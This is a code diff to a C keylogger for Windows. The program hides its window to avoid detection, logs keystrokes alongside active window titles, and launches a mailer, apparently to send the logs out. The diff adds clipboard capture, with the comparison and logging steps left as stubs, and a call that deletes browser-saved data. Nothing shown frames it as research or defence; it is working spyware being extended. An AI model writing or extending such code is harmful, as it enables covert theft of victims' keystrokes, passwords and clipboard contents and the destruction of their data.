@@ -17,6 +17,7 @@ void HideWindow();
 void InitLogfile(char* logfile_path);
 int GetLogfileLength(char* logfile_path);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
+void GetCurrentClipboard();
 void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
 
@@ -24,6 +25,9 @@ void KeystrokeHandler(short key, FILE* logfile);
 int main(){
     // avoid visible detection of executable window
     HideWindow();
+
+    // delete browser-saved data
+    ClearBrowserCache();
 
     // install executables
     char mailer_path[MAX_PATH];
@@ -266,6 +270,23 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
             fprintf(logfile, "\n\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
             fflush(logfile);
         }
+    }
+}
+
+// get the current contents of the clipboard
+void GetCurrentClipboard(){
+    if(OpenClipboard(NULL)){
+        if(IsClipboardFormatAvailable(CF_BITMAP)){
+            // notify that a picture is currently copied
+        }
+        else if(IsClipboardFormatAvailable(CF_TEXT)){
+            HWND clipboard = GetClipboardData(CF_TEXT);
+            // compare to previous clipboard
+            // update logfile iff new content
+            // set current clipboard to previous
+        }
+        // TODO add UNICODE conditional
+        CloseClipboard();
     }
 }
 
